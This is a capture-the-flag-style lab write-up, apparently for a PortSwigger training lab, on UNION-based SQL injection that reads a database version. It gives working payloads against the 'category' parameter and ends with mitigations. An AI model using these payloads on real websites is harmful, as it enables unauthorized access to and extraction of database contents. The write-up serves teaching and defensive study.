# SQL Injection Lab – Retrieving Database Version (UNION Attack)

## Overview

This lab demonstrates how to exploit a **UNION-based SQL Injection vulnerability** to retrieve the **database version** running on the backend server.

By injecting a crafted SQL query into a vulnerable parameter, we can combine our query with the original query using the `UNION` operator and extract sensitive information from the database.

**Category:** Web Exploitation  
**Difficulty:** Beginner – Intermediate  
**Goal:** Retrieve the backend database version.

---

## Tools Used

- Burp Suite / OWASP ZAP
- Web Browser
- SQL Injection Cheat Sheet
- HTTP Repeater

---

## Initial Reconnaissance

The application contains a parameter called:

```
category
```

Example request:

```
/filter?category=Gifts
```

Previous analysis of the lab confirms that this parameter is vulnerable to **SQL Injection**.

The goal is to exploit this vulnerability to extract the **database version**.

---

## Identifying the Number of Columns

To perform a successful UNION-based SQL injection, the number of columns in the injected query must match the number of columns in the original query.

From previous testing, we determined that the query returns **two columns**.

Therefore, our injected query must also contain **two columns**.

Example test payload:

```
' UNION SELECT 'ABC','DEF'
```

---

## Testing the Injection

Intercept the request and send it to **Repeater**.

Original request:

```
/filter?category=Gifts
```

Injected request:

```
/filter?category=Gifts' UNION SELECT 'ABC','DEF'--
```

This attempt resulted in an **Internal Server Error**.

---

## Fixing the Comment Syntax

Different databases use different comment characters.

Common SQL comment types:

```
--  (works for most databases)
#   (commonly used in MySQL)
```

We retry the injection using the **hash comment**.

```
/filter?category=Gifts' UNION SELECT 'ABC','DEF'# 
```

After sending the request, the response page displays:

```
ABC
DEF
```

This confirms that the **SQL injection is successful**.

---

## Identifying the Database Type

To retrieve the database version, we must use the correct syntax depending on the database type.

Common queries:

### Oracle

```
SELECT banner FROM v$version
```

### MySQL / Microsoft SQL Server

```
SELECT @@version
```

Since the syntax for **MySQL and Microsoft SQL Server** is the same, we can attempt:

```
@@version
```

---

## Retrieving the Database Version

We modify the injection payload to request the version.

```
/filter?category=Gifts' UNION SELECT @@version,'DEF'# 
```

Explanation:

- `@@version` retrieves the database version.
- `'DEF'` is used to maintain the required **two-column structure**.

---

## Result

The lab confirms success with the message:

```
Congratulations, you solved the lab.
```

Viewing the response in the browser reveals the database version.

Example output:

```
8.0.31
```

---

## Analysis

The vulnerability exists because the application directly includes user input inside an SQL query without proper sanitization.

Example vulnerable query structure:

```sql
SELECT name, description
FROM products
WHERE category = 'Gifts'
```

When the attacker injects:

```sql
' UNION SELECT @@version,'DEF'
```

The final query becomes:

```sql
SELECT name, description
FROM products
WHERE category = 'Gifts'
UNION SELECT @@version,'DEF'
```

This allows the attacker to retrieve data from the database.

---

## Lessons Learned

- UNION-based SQL injection can be used to extract database information.
- The number of columns in the injected query must match the original query.
- Different databases use different syntax for retrieving version information.

---

## Mitigation

To prevent SQL injection vulnerabilities:

1. Use **Parameterized Queries (Prepared Statements)**.
2. Validate and sanitize user input.
3. Use **ORM frameworks** instead of raw SQL queries.
4. Implement **Web Application Firewalls (WAF)**.

Example secure query:

```python
cursor.execute("SELECT name, description FROM products WHERE category = ?", (category,))
```

---

## References

- OWASP SQL Injection Guide
- PortSwigger Web Security Academy
- SQL Injection Cheat Sheet
